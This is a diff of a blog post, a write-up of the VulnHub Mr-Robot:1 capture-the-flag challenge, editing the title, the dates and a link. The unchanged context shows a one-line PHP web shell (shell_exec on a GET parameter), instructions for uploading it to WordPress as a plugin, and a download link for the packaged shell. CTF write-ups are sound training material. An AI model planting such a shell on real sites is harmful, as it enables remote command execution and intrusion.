@@ -1,6 +1,7 @@
 ---
-title: "Mr-Robot:1 ~ Writeup"
+title: "VulnHub's Mr-Robot Writeup"
 publishedAt: "2016-07-12"
+updatedAt: "2020-10-12"
 summary: "Writeup of Vulnhub's Mr-Robot:1 CTF challenge."
 ---
 
@@ -142,7 +143,7 @@ Author URI: https://nikolaskama.me/
 echo shell_exec($_GET['e']);
 ```
 
-This file is everything we need at this point. We simply have to upload it to the WordPress platform as a new plugin, by navigating to `Plugins > Add New > Upload Plugin`, and then dragging and dropping the file in `zip`, compressed format. You can install the complete file from [here](https://www.dropbox.com/s/7fr9nbfb4rdxgat/shell.php.zip?dl=0).
+This file is everything we need at this point. We simply have to upload it to the WordPress platform as a new plugin, by navigating to `Plugins > Add New > Upload Plugin`, and then dragging and dropping the file in `zip`, compressed format. You can install [the complete file from here](https://www.dropbox.com/s/7fr9nbfb4rdxgat/shell.php.zip?dl=0).
 
 Once the plugin is successfully installed, you should see this in your browser:
 
